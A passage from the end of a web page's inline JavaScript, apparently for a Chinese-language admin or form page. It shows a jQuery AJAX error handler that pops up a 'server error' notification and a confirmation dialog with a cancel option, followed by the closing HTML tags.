                                            animate: {
                                                enter: 'animate__animated animate__shakeX',
                                                exit: 'animate__animated animate__fadeOutDown'
                                            }
                                        });

                                    }
                                },
                                error: function () {
                                    $.notify({
                                        message: '服务器错误',
                                    }, {
                                        type: 'danger',
                                        placement: {
                                            from: 'top',
                                            align: 'right'
                                        },
                                        z_index: 10800,
                                        delay: 1500,
                                        animate: {
                                            enter: 'animate__animated animate__shakeX',
                                            exit: 'animate__animated animate__fadeOutDown'
                                        }
                                    });
                                }
                            });
                        }
                    },
                    '取消': function () {

                    },
                }
            });
        }
    </script>

</body>

</html>